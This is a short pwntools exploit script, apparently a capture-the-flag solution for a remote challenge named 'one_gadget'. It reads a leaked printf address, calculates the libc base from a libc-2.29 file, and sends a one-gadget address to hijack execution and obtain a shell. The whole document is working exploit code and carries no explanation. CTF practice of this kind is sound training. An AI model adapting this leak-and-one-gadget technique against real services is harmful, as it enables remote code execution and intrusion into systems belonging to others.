from pwn import *
context.log_level='debug'
#p=process('./one_gadget')
p=remote('node3.buuoj.cn',26368)
#gdb.attach(p)
libc=ELF('libc-2.29.so')
p.recvuntil('u:')
temp=p.recv(14)
print_addr=int(temp,16)
print temp
print print_addr
print libc.symbols['printf']
libcbase=print_addr-libc.symbols['printf']
one_gadget=libcbase+0xe237f
p.recvuntil('Give me your one gadget:')
p.send(p64(one_gadget))
